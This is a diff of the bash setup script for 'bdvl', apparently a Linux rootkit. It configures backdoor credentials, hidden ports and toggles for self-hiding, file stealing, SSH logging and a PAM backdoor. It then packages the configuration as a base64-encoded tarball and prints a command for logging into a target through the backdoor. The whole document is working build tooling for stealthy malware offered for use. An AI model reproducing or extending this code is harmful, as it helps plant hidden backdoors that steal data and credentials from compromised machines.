@@ -56,7 +56,7 @@ get_setting(){ # $1 = var
     [ ! -z "`printf "${!name}"`" ] && input="${!name}"
     echo "$name = $input" >> $BDVLSO.creds
 
-    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$name" == *"_PWD" ]] && \
+    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$name" == *"_PWD" ]] &&
         input="`crypt_password $input`" # if the variable is intended to be a password,
                                         # make sure it's hashed before writing it anywhere
 
@@ -105,16 +105,16 @@ setup_configuration(){
 
     echo; necho "Preparing your settings"
     var_placeholders=(`find_var_placeholders "${headers[*]}"`)
+    echo 'This is the configuration of this bdvl.' > $BDVLSO.creds
     for i in ${!var_placeholders[@]}; do
         local current_var="${var_placeholders[$i]}"
         settings+=(`get_setting "$current_var"`)
 
-        [ "`toggle_enabled HIDE_PORTS`" == "false" ] && continue  # don't if we don't need to
+        [ "`toggle_enabled HIDE_PORTS`" == "false" ] && continue
         IFS=':' read -r curvar_val curvar_name <<< "${settings[$i]}"
         [[ "$curvar_name" == *"PORT"* ]] && add_hiddenport $curvar_name $curvar_val
     done
 
-    secho "These are your defined/generated settings:"
     output_creds
 
     necho "Overwriting old variable placeholders"
@@ -124,38 +124,27 @@ setup_configuration(){
 
     if [ $DOCOMPRESS == 1 ]; then
         [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
-        echo; secho "Beginning compression of $NEW_MDIR"
+        secho "Going to compress this configuration."
 
-        verbose "Writing some necessary files to $NEW_MDIR"
-        verbose "Writing environment settings"
-        write_defaults $NEW_MDIR/settings
-
-        verbose "Writing toggle settings"
-        local check_toggles=(USE_CRYPT HIDE_SELF HIDE_PORTS FILE_STEAL LOG_SSH)
-
-        for toggle in ${check_toggles[@]}; do toggle_setting $toggle >> $NEW_MDIR/toggles.conf; done
-
+        necho "Writing necessary files"
+        write_defaults $NEW_MDIR/settings.cfg
+        local check_toggles=(USE_CRYPT HIDE_SELF HIDE_PORTS FILE_STEAL LOG_SSH READ_GID_FROM_FILE)
+        for toggle in ${check_toggles[@]}; do toggle_setting $toggle >> $NEW_MDIR/toggles.cfg; done
         [ -f ./etc/.rolf ] && cp ./etc/.rolf $NEW_MDIR/.rolf
         [ -f ./etc/id_rsa.pub ] && { verbose 'Copying id_rsa.pub'; cp ./etc/id_rsa.pub $NEW_MDIR/; }
+        [ `toggle_enabled READ_GID_FROM_FILE` == 'true' ] && echo -n $MAGIC_GID > ./$NEW_MDIR/magic_gid
 
         local tarname="$NEW_MDIR.tar.gz"
-        verbose "tarball name = $tarname"
+        verbose "Archive name: $tarname"
         sleep 1
-        tar cpfz $tarname $NEW_MDIR || { eecho "Failure trying to compress with tar (gzip)" && return; }
-        secho "Finished compressing successfully"
+        tar cpfz $tarname $NEW_MDIR || { eecho "Failure trying to compress with tar (gzip)"; return; }
+        secho "Done compressing"
 
         local tarb64="$NEW_MDIR.b64"
         necho "Writing $tarname into $tarb64"
-        cat $tarname | base64 > $tarb64
+        cat $tarname | base64 -w 0 > $tarb64
 
-        secho "Done."
-
-        if [ `toggle_enabled "USE_PAM_BD"` == 'true' ]; then
-            local addr_src='http://wtfismyip.com/text'
-            [ -f `bin_path curl` ] && local addr_q="curl -s $addr_src"
-            [ -f `bin_path wget` ] && local addr_q="wget -q -O - $addr_src"
-            echo -e "\n\tAfter bdvl is installed:"
-            echo -e "\t\e[32mbash etc/ssh.sh $BD_UNAME <TARGET> $PAM_PORT # $BD_PWD\e[0m\n"
-        fi
+        [ `toggle_enabled "USE_PAM_BD"` == 'true' ] &&
+            secho "bash etc/ssh.sh $BD_UNAME <TARGET> $PAM_PORT # $BD_PWD"
     fi
 }
